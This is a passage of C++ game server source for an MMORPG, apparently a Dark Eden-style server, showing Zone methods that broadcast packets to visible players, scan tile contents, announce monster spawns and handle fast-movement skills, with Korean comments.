	// 광역 마법의 결과를 효과적으로 보여주기 위함이다.
	//
	// *NOTE
	//
	// - 최적화를 한다면 VisionInfo에 PLUS_SIGHT라는 변수를 추가하여 연산
	//
	//-------------------------------------------------------------------
	endx = min(m_Width - 1, x1 + maxViewportWidth + 1);
	endy = min(m_Height- 1, y1 + maxViewportLowerHeight + 1);

	for (ix = max(0, x1 - maxViewportWidth - 1); ix <= endx ; ix++) 
	{
		for (iy = max(0, y1 - maxViewportUpperHeight - 1); iy <= endy ; iy++) 
		{
			Tile& rTile = m_pTiles[ix][iy];	// by sigi.2002.5.8

			// 타일에 크리처가 있는 경우에만
			if (rTile.hasCreature()) 
			{
				const forward_list<Object*> & objectList = rTile.getObjectList();

				for (forward_list<Object*>::const_iterator itr = objectList.begin() ; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE; itr++) 
				{

					Creature* pCreature = dynamic_cast<Creature*>(*itr);		
					Assert(pCreature != NULL);

					// PC이면서, creature list에 속하지 않으면서 (x,y)를 볼 수 있는 경우
					if (pCreature->isPC())
					{
						// 이 패킷을 발생시킨 놈들인지를 체크한다.
						bool belong = false;
						for (list<Creature*>::const_iterator itr = creatureList.begin() ; itr != creatureList.end() ; itr++) 
						{
							/*
							if( pCreature->isMonster() )
							{
								Monster* pMonster = dynamic_cast<Monster*>(pCreature);
								// edit by sonic 2006.12.29  錦攣훙잚퓜癎珞加뎌뵨加濫檢
								if(pMonster->getMonsterType() 	== 482 ||
									 pMonster->getMonsterType() 	== 673 )
									 {
									 		belong =true;
									 		break;
									 } 
								}
							// end by sonic 
							*/
							if (pCreature == *itr) 
							{
								belong = true;
								break;
							}
						}

						if (!belong && pCreature->getVisionState(x1,y1) >= IN_SIGHT && pCreature->getVisionState(x2, y2) >= IN_SIGHT)
						{
							// 숨어 있는 넘이 안 보이면서 스킬을 쓸 이유가 없다.. 따라서 HIDE체크는 하지 않는다.
							Player* pPlayer = pCreature->getPlayer();
							//pPlayer->sendPacket(pPacket);
							pPlayer->sendStream( &outputStream );
							cList.push_back(pCreature);
						}
					}
				}
			}
		}
	}

	// add creature list to cList
	for (list<Creature*>::const_iterator itr = creatureList.begin(); itr != creatureList.end(); itr++)
	{
		cList.push_back(*itr);
	}

	__END_PROFILE_ZONE("Z_BC_SKILL")

	return cList;

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// (x,y) 의 사건을 볼 수 있는, creatureList 에 소속된 크리처를 제외한 모든 PC 들에게 
// 패킷을 브로드캐스트한다.
//
// *NOTE*
// 지속 Tile Magic일 경우 Plus 를 True로 두게 되며 Plus 변수가 True일 경우..
// Magic 범위의 반지름 만큼 더 범위를 확장하여 보내준다.. 광역 마법이 짤리지 않고,
// 효과적으로 보여주기 위함이다.
//
// *CAUTION*
//
// unsigned char 를 ZoneCoord_t 로 사용할 때, overflow 및 underflow 를 주의할 것
//////////////////////////////////////////////////////////////////////////////
void Zone::broadcastPacket(ZoneCoord_t cx, ZoneCoord_t cy, Packet* pPacket, const list<Creature *> & creatureList, bool Plus, Range_t Range)
	
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_EXCLIST")

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
#endif
	pPacket->writeHeaderNBody( outputStream );
	
	ZoneCoord_t ix = 0;
	ZoneCoord_t iy = 0;
	ZoneCoord_t endx = 0;
	ZoneCoord_t endy = 0;

	//////////////////////////////////////////////////////////////////////////////
	// 루프 변수 초기화..
	//
	// Plus 변수가 참일 경우 Range 만큼 더 보내 준다..
	// 광역 마법의 결과를 효과적으로 보여주기 위함이다.
	//
	// *NOTE
	// - 최적화를 한다면 VisionInfo에 PLUS_SIGHT라는 변수를 추가하여 연산
	//////////////////////////////////////////////////////////////////////////////
	endx = min(m_Width - 1, cx + maxViewportWidth + 1 + Range);
	endy = min(m_Height - 1, cy + maxViewportLowerHeight  + 1 + Range);

	for (ix =  max(0, cx - maxViewportWidth - 1 - Range); ix <= endx ; ix++) 
	{
		for (iy = max(0, cy - maxViewportUpperHeight - 1 -  Range); iy <= endy ; iy++) 
		{
			if ( VisionInfoManager::getVisionState( ix, iy, cx, cy ) == OUT_OF_SIGHT || Plus ) continue;
			Tile& rTile = m_pTiles[ix][iy]; // by sigi. 2002.5.8

			// 타일에 크리처가 있는 경우에만
			if (rTile.hasCreature()) 
			{
				const forward_list<Object*> & objectList = rTile.getObjectList();
				forward_list<Object*>::const_iterator itr = objectList.begin();

                for (; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE; itr++) 
				{
					Creature* pCreature = dynamic_cast<Creature*>(*itr);
					Assert(pCreature != NULL);

					// PC이면서, creatureList에 소속되지도 않으면서, (x,y)를 볼 수 있는 경우
					if (pCreature->isPC()) 
					{
						bool belong = false;
						for (list<Creature*>::const_iterator itr = creatureList.begin() ; itr != creatureList.end() ; itr++) 
						{
							/*
							// edit by sonic 2006.12.29  錦攣훙잚퓜癎珞加뎌뵨加濫檢
							if( pCreature->isMonster() )
							{
								Monster* pMonster = dynamic_cast<Monster*>(pCreature);

								if(pMonster->getMonsterType() 	== 482 ||
									 pMonster->getMonsterType() 	== 673 )
									 {
									 		belong =true;
									 		break;
									 } 
								}
							// end by sonic 
							*/
							if (pCreature == *itr) 
							{
								belong = true;
								break;
							}
						} // for

//						if ((!belong && pCreature->getVisionState(cx,cy) >= IN_SIGHT) ||(!belong && Plus)) 
						if ( !belong )
						{
							//pCreature->getPlayer()->sendPacket(pPacket);
							pCreature->getPlayer()->sendStream( &outputStream );
						} // if
					} // if

				} // for
			}//if
		}//for
	}//for

	__END_PROFILE_ZONE("Z_BC_EXCLIST")

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// scan
// (x,y)에서 시야 영역안에 존재하는 모든 객체들의 정보를 받아온다.
//////////////////////////////////////////////////////////////////////////////
void Zone::scan (Creature* pPC, ZoneCoord_t cx, ZoneCoord_t cy, Packet* pPacket)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_SCAN")

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
#endif
	pPacket->writeHeaderNBody( outputStream );

	Assert(pPC->isPC());

	Player* pPlayer = pPC->getPlayer();
	Assert(pPlayer);

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
//			bool bCanSeeThere = (pPC->getVisionState(ix, iy) >= IN_SIGHT);	// 순수 시야만으로 볼 수 있나?
			if ( pPC->getVisionState( ix, iy ) == OUT_OF_SIGHT ) continue;
			
			const forward_list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();

			for (forward_list<Object*>::const_iterator itr = objectList.begin() ; itr != objectList.end() ; itr++) 
			{
				Assert(*itr != NULL);

				//--------------------------------------------------------------------------------
				//
				// 각 객체의 OBJECT CLASS에 따라서 적합한 GCAddXXX 패킷을 만들어서
				// owner 에게 전송한다. 
				//
				// *NOTES*
				//
				// 가장 출현 확률이 높은 객체 CLASS 가 case 앞부분에 나와야 한다.
				//
				//--------------------------------------------------------------------------------
				switch ((*itr)->getObjectClass()) 
				{
					//--------------------------------------------------------------------------------
					// 타일 위에 크리처가 있을 경우
					//--------------------------------------------------------------------------------
					case Object::OBJECT_CLASS_CREATURE :
						{
							//--------------------------------------------------------------------------------
							// PC의 경우 pPacket을 전송해야 하며, !PC인 경우에는 전송할 필요가 없다.
							// 또한 모든 크리처의 정보를 owner에게 전송해야 한다.
							//--------------------------------------------------------------------------------
							Creature* pCreature = dynamic_cast<Creature*>(*itr);
							Assert(pCreature != NULL);

							if (pCreature == pPC)	// 자기 자신의 정보는 받을 필요가 없다.
								continue;

							// 안보이면 쌩
//							if ( !canSee( pPC, pCreature ) ) continue;
							bool bCanSee = canSee( pPC, pCreature );

							switch (pCreature->getCreatureClass()) 
							{
								case Creature::CREATURE_CLASS_MONSTER :
									{
										Monster* pMonster = dynamic_cast<Monster*>(pCreature);
										if (bCanSee)
										{
											// by sigi
											Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, pPC );

											if (pAddMonsterPacket!=NULL)
											{
												pPlayer->sendPacket( pAddMonsterPacket );

												delete pAddMonsterPacket;
											}
										}

										//--------------------------------------------------------------------------------
										// 몬스터가 PC 를 볼 수 있는 경우, PC 를 몬스터의 Enemy 로 지정한다.
										//--------------------------------------------------------------------------------
										VisionState vs = pMonster->getVisionState(cx,cy);
	
										// Aggressive 몬스터일 경우에만 적으로 등록해준다.
										if (vs >= IN_SIGHT && pMonster->getAlignment() == ALIGNMENT_AGGRESSIVE) 
										{
											if (isPotentialEnemy(pMonster, pPC))
											{
												pMonster->addPotentialEnemy(pPC);
											}
										}
									}
									break;

								case Creature::CREATURE_CLASS_SLAYER :
									{
										// 내가 그곳을 볼 수 있다면(darkness와 관련하여)
										if (bCanSee)
										{	
//											if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST)
//												&& !pCreature->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE) || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) )
//													|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeSniping( pCreature ) ) )
//											{
												Slayer* pSlayer = dynamic_cast<Slayer*>(pCreature);
												GCAddSlayer gcAddSlayer;
												makeGCAddSlayer(&gcAddSlayer, pSlayer);
												pPlayer->sendPacket(&gcAddSlayer);
//											}
										}

										// 상대(슬레이어)가 나를 볼 수 있다면	
										if (pPacket && pCreature->getVisionState(cx, cy) >= IN_SIGHT) 
										{
											Assert(pCreature->getPlayer() != NULL);
											// canSee 로 대체. 2003.05.29 by bezz
											if ( canSee( pCreature, pPC ) )
											{
												//pCreature->getPlayer()->sendPacket(pPacket);
												pCreature->getPlayer()->sendStream( &outputStream );
											}
										}
									}
									break;
		
								case Creature::CREATURE_CLASS_VAMPIRE :
									{
										if (bCanSee)
										{
											// PC가 ObservingEye 이펙트를 가지고 있다면 이펙트를 가져온다.
//											EffectObservingEye* pEffectObservingEye = NULL;
//											if ( pPC->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//											{
//												pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pPC->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
//												//Assert( pEffectObservingEye != NULL );
//											}

											if (pCreature->isFlag(Effect::EFFECT_CLASS_HIDE)) 
											{
								//				if (!pPC->isFlag(Effect::EFFECT_CLASS_GHOST)
								//					&& (pPC->isVampire() 
								//						|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN))
								//					)
								//				{
													GCAddBurrowingCreature gcABC;
													gcABC.setObjectID(pCreature->getObjectID());
													gcABC.setName(pCreature->getName());
													gcABC.setX(ix);
													gcABC.setY(iy);

													pPlayer->sendPacket(&gcABC);
								//				}	
											} 
											else 
											{
								//				if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST)
								//					&& (!pCreature->isFlag(Effect::EFFECT_CLASS_INVISIBILITY)
								//						|| pPC->isVampire() 
								//						|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY)
								//						|| ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pCreature ) ) )
								//					)
								//				{
													Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
													GCAddVampire gcAddVampire;
													makeGCAddVampire(&gcAddVampire, pVampire);
													pPlayer->sendPacket(&gcAddVampire);
								//				}
											}
										}
		
										// 상대가 나를 볼 수 있다면..
										// 상대는 vampire이므로 시야만 가능하다면 darkness와는 관계가 없다. 	
										// 뱀파이어가 상대일땐 스나이핑 모드라면 절대 못 본다...
										//
										// 근데 scan 함수 특성상 snipping 모드를 해제 하지 않고 넘어갈 수는 없다.
										// canSee로 대체
										if (pPacket && pCreature->getVisionState(cx, cy) >= IN_SIGHT && canSee( pCreature, pPC )) 
										{
											Assert(pCreature->getPlayer() != NULL);
											//pCreature->getPlayer()->sendPacket(pPacket);
											pCreature->getPlayer()->sendStream(&outputStream);
										}
									}
									break;

								case Creature::CREATURE_CLASS_OUSTERS :
									{
										if (bCanSee)
										{
											// PC가 ObservingEye 이펙트를 가지고 있다면 이펙트를 가져온다.
//											EffectObservingEye* pEffectObservingEye = NULL;
//											if ( pPC->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//											{
//												pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pPC->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
//												//Assert( pEffectObservingEye != NULL );
//											}

//											if ( !pCreature->isFlag(Effect::EFFECT_CLASS_GHOST) )
//											{
												Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);
												GCAddOusters gcAddOusters;
												makeGCAddOusters(&gcAddOusters, pOusters);
												pPlayer->sendPacket(&gcAddOusters);
//											}
										}

										if ( pPacket && pCreature->getVisionState(cx, cy) >= IN_SIGHT && canSee( pCreature, pPC ) )
										{
											Assert( pCreature->getPlayer() != NULL );
											//pCreature->getPlayer()->sendPacket(pPacket);
											pCreature->getPlayer()->sendStream(&outputStream);
										}
									}
									break;
		
								case Creature::CREATURE_CLASS_NPC :
									{
										if (bCanSee)
										{
											NPC* pNPC = dynamic_cast<NPC*>(pCreature);
											GCAddNPC gcAddNPC;
											makeGCAddNPC(&gcAddNPC, pNPC);
											pPlayer->sendPacket(&gcAddNPC);
										}
									}
									break;
		
								default :
									throw Error("invalid creature class");
	
							}//switch (pCreature->getCreatureClass())
						}//case Object::OBJECT_CLASS_CREATURE :
	
						break;

					//--------------------------------------------------------------------------------
					// 타일 위에 아이템이 있을 경우
					//--------------------------------------------------------------------------------
					case Object::OBJECT_CLASS_ITEM :
						{
//							if (bCanSeeThere)
//							{
								Item* pItem = dynamic_cast<Item*>(*itr);

								if (pItem->getItemClass() == Item::ITEM_CLASS_CORPSE) 
								{
									switch (pItem->getItemType()) 
									{
										case SLAYER_CORPSE :
											{
												SlayerCorpse* pSlayerCorpse = dynamic_cast<SlayerCorpse*>(pItem);
												GCAddSlayerCorpse gcAddSlayerCorpse;
												makeGCAddSlayerCorpse(&gcAddSlayerCorpse, pSlayerCorpse);
												pPlayer->sendPacket(&gcAddSlayerCorpse);
											}
											break;
										case VAMPIRE_CORPSE :
											{
												VampireCorpse* pVampireCorpse = dynamic_cast<VampireCorpse*>(pItem);
												GCAddVampireCorpse gcAddVampireCorpse;
												makeGCAddVampireCorpse(&gcAddVampireCorpse, pVampireCorpse);
												pPlayer->sendPacket(&gcAddVampireCorpse);
											}
											break;
										case OUSTERS_CORPSE :
											{
												OustersCorpse* pOustersCorpse = dynamic_cast<OustersCorpse*>(pItem);
												GCAddOustersCorpse gcAddOustersCorpse;
												makeGCAddOustersCorpse(&gcAddOustersCorpse, pOustersCorpse);
												pPlayer->sendPacket(&gcAddOustersCorpse);
											}
											break;
										case NPC_CORPSE :
											{
												throw UnsupportedError(__PRETTY_FUNCTION__);
											}
											break;
										case MONSTER_CORPSE :
											{
												MonsterCorpse* pMonsterCorpse = dynamic_cast<MonsterCorpse*>(pItem);
												GCAddMonsterCorpse gcAddMonsterCorpse;
												makeGCAddMonsterCorpse(&gcAddMonsterCorpse, pMonsterCorpse, ix, iy);
												pPlayer->sendPacket(&gcAddMonsterCorpse);

												sendRelicEffect( pMonsterCorpse, pPlayer );
											}
											break;
									}//switch
								}
								else if (pItem->getItemClass() == Item::ITEM_CLASS_MINE && pItem->isFlag(Effect::EFFECT_CLASS_INSTALL))
								{	
									if (pPC->isFlag(Effect::EFFECT_CLASS_REVEALER) )
									{
										GCAddInstalledMineToZone gcAddMine;
										gcAddMine.setObjectID(pItem->getObjectID());
										gcAddMine.setX(cx);
										gcAddMine.setY(cy);
										gcAddMine.setItemClass(pItem->getItemClass());
										gcAddMine.setItemType(pItem->getItemType());
										gcAddMine.setOptionType(pItem->getOptionTypeList());
										gcAddMine.setDurability(pItem->getDurability());
										pPlayer->sendPacket(&gcAddMine);
									}
								}
							   	else 
								{
									GCAddNewItemToZone gcAddNewItemToZone;
									makeGCAddNewItemToZone(&gcAddNewItemToZone, pItem, ix, iy);
									pPlayer->sendPacket(&gcAddNewItemToZone);
								}
//							}
						}
						break;

					//--------------------------------------------------------------------------------
					// 타일 위에 이펙트가 있을 경우
					//--------------------------------------------------------------------------------
					case Object::OBJECT_CLASS_EFFECT :
						{
							Effect* pEffect = dynamic_cast<Effect*>(*itr);
//							if (bCanSeeThere)
//							{
								if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_VAMPIRE_PORTAL)
								{
									EffectVampirePortal* pEffectVampirePortal = dynamic_cast<EffectVampirePortal*>(pEffect);
									ZONE_COORD zonecoord = pEffectVampirePortal->getZoneCoord();

									GCAddVampirePortal gcAddVampirePortal;
									gcAddVampirePortal.setObjectID(pEffect->getObjectID());
									gcAddVampirePortal.setOwnerID(pEffectVampirePortal->getOwnerID());
									gcAddVampirePortal.setX(ix);
									gcAddVampirePortal.setY(iy);
									gcAddVampirePortal.setTargetZoneID(zonecoord.id);
									gcAddVampirePortal.setTargetX(zonecoord.x);
									gcAddVampirePortal.setTargetY(zonecoord.y);
									gcAddVampirePortal.setDuration(pEffectVampirePortal->getRemainDuration());
									gcAddVampirePortal.setCreateFlag(0);

									pPlayer->sendPacket(&gcAddVampirePortal);
								}
								// by sigi. 2002.6.10
								else if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_SANCTUARY)
								{
									EffectSanctuary* pEffectSanctuary = dynamic_cast<EffectSanctuary*>(pEffect);

									ZoneCoord_t centerX = pEffectSanctuary->getCenterX();
									ZoneCoord_t centerY = pEffectSanctuary->getCenterY();
									
									// sanctuary는 중심좌표인 경우만 packet을 보낸다.
									if (centerX==ix && centerY==iy)
									{
										GCAddEffectToTile gcAddEffectToTile;

										gcAddEffectToTile.setObjectID(pEffect->getObjectID());
										gcAddEffectToTile.setXY(ix, iy); 
										gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
										gcAddEffectToTile.setDuration(pEffect->getRemainDuration());

										pPlayer->sendPacket(&gcAddEffectToTile);
									}
								}
								// Broadcasting Effect 인지 체크 추가 by Sequoia 2003.3.31
								else if (pEffect->isBroadcastingEffect())
								{
									GCAddEffectToTile gcAddEffectToTile;

									gcAddEffectToTile.setObjectID(pEffect->getObjectID());
									gcAddEffectToTile.setXY(ix, iy); 
									gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
									gcAddEffectToTile.setDuration(pEffect->getRemainDuration());

									pPlayer->sendPacket(&gcAddEffectToTile);
								}
//							}
						}
						break;


					//--------------------------------------------------------------------------------
					// 타일 위에 장애물이 있을 경우
					//--------------------------------------------------------------------------------
					case Object::OBJECT_CLASS_OBSTACLE :
						{
							/*
							*/
						}
						break;

					//--------------------------------------------------------------------------------
					// 타일 위에 포탈이 있을 경우
					//--------------------------------------------------------------------------------
					case Object::OBJECT_CLASS_PORTAL :
						{
							/*
							*/
						}
						break;

					default :
						throw Error("invalid object class");

				}//switch ((*itr)->getObjectClass())
			}//for
			
		}//for
	}//for

	__END_PROFILE_ZONE("Z_SCAN")

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// 몬스터가 존의 (x,y)에 새로 리젠되었을 경우, 시야 영역안에 존재하는 모든 PC들에게
// GCAddXXX 패킷을 보내면서, 동시에 그 PC 를 잠재적인 적으로 간주한다.
//////////////////////////////////////////////////////////////////////////////
void Zone::scanPC (Creature* pCreature)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_SCAN_PC")

	Monster* pMonster = NULL;

	Assert(pCreature != NULL);

	ZoneCoord_t cx = pCreature->getX();
	ZoneCoord_t cy = pCreature->getY();

	Packet*                pGCAddXXX = NULL;

	// 크리쳐의 종류에 따라, 패킷을 만들어둔다.
	Creature::CreatureClass CClass = pCreature->getCreatureClass();

	bool isMonster = pCreature->isMonster();
//	bool isMonsterHide = false;
//	bool isMonsterInvisibility = false;

	if (CClass == Creature::CREATURE_CLASS_MONSTER)
	{
		pMonster = dynamic_cast<Monster*>(pCreature);

		// by sigi
		pGCAddXXX = createMonsterAddPacket( pMonster, NULL );

//		isMonsterHide = pMonster->isFlag(Effect::EFFECT_CLASS_HIDE);
//		isMonsterInvisibility = pMonster->isFlag(Effect::EFFECT_CLASS_INVISIBILITY);

		/*
		if (pCreature->isFlag(Effect::EFFECT_CLASS_HIDE))
		{
			gcABC.setObjectID(pMonster->getObjectID());
			gcABC.setName(pMonster->getName());
			gcABC.setX(cx);
			gcABC.setY(cy);
			pGCAddXXX = &gcABC;
		}
		else
		{
			makeGCAddMonster(&gcAddMonster, pMonster);
			pGCAddXXX = &gcAddMonster;
		}
		*/
	}
	else if (CClass == Creature::CREATURE_CLASS_NPC)
	{
		NPC* pNPC = dynamic_cast<NPC*>(pCreature);

		GCAddNPC* pGCAddNPC = new GCAddNPC;

		makeGCAddNPC(pGCAddNPC, pNPC);

		pGCAddXXX = pGCAddNPC;
	}
	else 
	{
		Assert(false);
	}

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			const forward_list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
			forward_list<Object*>::const_iterator itr = objectList.begin();

			for (; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE ; itr++) 
			{
				if ((*itr)->getObjectClass() == Object::OBJECT_CLASS_CREATURE)
				{
					Creature* pPC = dynamic_cast<Creature*>(*itr);
					Assert(pPC != NULL);

					// PC 이면서, 크리처를 볼 수 있는 경우
					if (pPC->isPC() && pPC->getVisionState(cx,cy) >= IN_SIGHT
						&& canSee( pPC, pCreature ))
//						&& !pPC->isFlag(Effect::EFFECT_CLASS_GHOST)
					{
						// Creature 가 Revealer 이펙트를 가지고 있다면 이펙트를 가져온다.
//						EffectRevealer* pEffectRevealer = NULL;
//						if ( pCreature->isFlag( Effect::EFFECT_CLASS_REVEALER ) )
//						{
//							pEffectRevealer = dynamic_cast<EffectRevealer*>(pCreature->findEffect( Effect::EFFECT_CLASS_REVEALER ) );
//							Assert( pEffectRevealer );
//						}
						
						// Creature 가 ObservingEye 이펙트를 가지고 있다면 이펙트를 가져온다.
//						EffectObservingEye* pEffectObservingEye = NULL;
//						if ( pCreature->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//						{
//							pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pCreature->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
//							//Assert( pEffectObservingEye != NULL );
//						}

						// 몬스터가 스나이핑을 쓸리는 없다 그래서 DETECT_HIDDEN과 INVISIBILITY만 체크 한다.
//						if (pPC->isVampire() ||
//							((!isMonsterHide || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN))// || ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide( pMonster ) ) )
//							&& (!isMonsterInvisibility || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) ) || ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pMonster ) )) 
//							)
//						{
							pPC->getPlayer()->sendPacket(pGCAddXXX);
//						}

						if (isMonster )
						{
							// (cx,cy)에 있는 몬스터가 (ix,iy)에 있는 PC를 볼 수 있는가?
							VisionState vs = pMonster->getVisionState(ix,iy);
							if (vs >= IN_SIGHT && pMonster->getAlignment() == ALIGNMENT_AGGRESSIVE && canSee( pCreature, pPC )) 
							{
								if (isPotentialEnemy(pMonster, pPC))
								{
									pMonster->addPotentialEnemy(pPC);
								}
							}
						}
					}

				} // if (creature)

			} // for itr

		} // for y
	} // for x

	if (pGCAddXXX != NULL)
	{
		delete pGCAddXXX;
	}

	__END_PROFILE_ZONE("Z_SCAN_PC")

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// P(x1,y1)에서 Q(x2,y2)로 빠른 이동한 크리처가 주변 영역에 존재하는 PC들에게 
// 브로드캐스트하는 메쏘드이다.
// for Skill FlashSliding, ShadowWalk
//////////////////////////////////////////////////////////////////////////////
bool Zone::moveFastPC(Creature* pPC, ZoneCoord_t x1, ZoneCoord_t y1, ZoneCoord_t x2, ZoneCoord_t y2, SkillType_t skillType)
{
	__BEGIN_TRY 
	__BEGIN_DEBUG

	// 이 메쏘드는 PC 를 대상으로 한다.
	Assert(pPC->isPC());
	
	// isAbleToMove 로 바꾼다. by bezz. 2002.12.28
	if ( !isAbleToMove( pPC ) )
		return false;

/*	if ( SiegeManager::Instance().isSiegeZone( m_ZoneID ) )
	{
		if ( !isPassLine( this, pPC->getX(), pPC->getY(), x2, y2, true ) ) return false;
	}*/

	 // 성물을 가지고 있는 경우라면.. 안전지대에 들어갈 수 없다.
	if (pPC->hasRelicItem())
	{
		return false;
	}

	if (pPC->isFlag(Effect::EFFECT_CLASS_HAS_FLAG) || pPC->isFlag( Effect::EFFECT_CLASS_HAS_SWEEPER))
		return false;

	if ( m_ZoneID == 1410 || m_ZoneID == 1411 ) return false;

	Tile& rTile = getTile( x1, y1 );

	if ( rTile.getEffect( Effect::EFFECT_CLASS_ON_BRIDGE ) != NULL ) return false;

	// 적당한 종착지점을 찾는다.
	// 전면부에서 적당한 지점..4개 검색
	Dir_t dir = calcDirection(x1, y1, x2, y2);

	// g_FastMoveSearchX, Y로 찾으면 된다. by sigi. 2002.5.8
	int* searchX = g_FastMoveSearchX[dir];
	int* searchY = g_FastMoveSearchY[dir];

	// 빈 타일인지 확인.
	int i=0;
	for(i = 0; i< 4; i++)
	{
		int targetX = x2 + searchX[i], targetY = y2 + searchY[i];
		if (targetX >= 0 && targetX < m_Width && targetY >= 0 && targetY < m_Height && 
			!m_pTiles[targetX][targetY].isBlocked(pPC->getMoveMode()) && !m_pTiles[targetX][targetY].hasPortal() &&
			// Sanctuary 가 걸려있지 않아야 한다. by Sequoia 2003.3.25
			m_pTiles[targetX][targetY].getEffect(Effect::EFFECT_CLASS_SANCTUARY) == NULL &&
			m_pTiles[x1][y1].getEffect(Effect::EFFECT_CLASS_SANCTUARY) == NULL
		)
		{
			x2 = targetX;
			y2 = targetY;
			break;
		}
	}
	if (i == 4) 
	{
		return false;	// 빈타일을 못찾았다!
	}
	
	Player* pPlayer = pPC->getPlayer();
	Assert(pPlayer);

	GCFastMove gcFastMove;
	gcFastMove.setObjectID(pPC->getObjectID());
	gcFastMove.setXY(x1, y1, x2, y2);
	gcFastMove.setSkillType( skillType );

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + gcFastMove.getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + gcFastMove.getPacketSize() + 2 );
#endif
	gcFastMove.writeHeaderNBody( outputStream );

	pPlayer->sendStream( &outputStream );

	// 퀘스트..
	dynamic_cast<PlayerCreature*>(pPC)->getGQuestManager()->fastMove();

	//////////////////////////////////////////////////////////////
	// move의 종류....
	// 이에따라 GCDelete나 Add등을 보내줘야 할 수 도 있다.
	
	// PC의 좌표 변경.
	pPC->setXYDir(x2, y2, dir);
	// 이전 타일에서 크리처를 삭제한다.

	try {
		m_pTiles[x1][y1].deleteCreature(pPC->getObjectID());	
	} catch (Error& e) {
		filelog("assertTile.txt", "moveFastPC : %s", e.toString().c_str());
		throw;
	}

	// 새 타일에 크리처를 추가한다.
	m_pTiles[x2][y2].addCreature(pPC);

	try {
		checkMine(this, pPC, x2, y2);
		checkTrap(this, pPC);
	} catch ( Throwable & t ) {
		filelog("CheckMineBug.txt", "%s : %s", "moveFastPC", t.toString().c_str());
	}

	if (pPC->isFlag(Effect::EFFECT_CLASS_GHOST))
	{
//		return false;
	}


	//--------------------------------------------------------------------------------
	// GCAddSlayer/GCAddVampire 패킷을 만들어둔다.
	// 현재의 정책에 의하면, GCAdd 패킷은 현재의 좌표를 바탕으로 한다.
	//--------------------------------------------------------------------------------
	Packet* pGCAddXXX = NULL;

	if (pPC->getCreatureClass() == Creature::CREATURE_CLASS_SLAYER) 
	{
		Slayer* pSlayer = dynamic_cast<Slayer*>(pPC);
/*		GCAddSlayer* pGCAddSlayer = new GCAddSlayer(pSlayer->getSlayerInfo3());
		pGCAddSlayer->setEffectInfo(pSlayer->getEffectInfo());*/
		GCAddSlayer* pGCAddSlayer = new GCAddSlayer;
		makeGCAddSlayer( pGCAddSlayer, pSlayer );

		pGCAddXXX = pGCAddSlayer;
	} 
	else if (pPC->getCreatureClass() == Creature::CREATURE_CLASS_VAMPIRE) 
	{
		Vampire* pVampire = dynamic_cast<Vampire*>(pPC);

		// 음.. hide상태에서 움직일 수는 없지만..
		// 미래를 대비.
		if (pPC->isFlag(Effect::EFFECT_CLASS_HIDE))
		{
			GCAddBurrowingCreature* pGCABC = new GCAddBurrowingCreature();
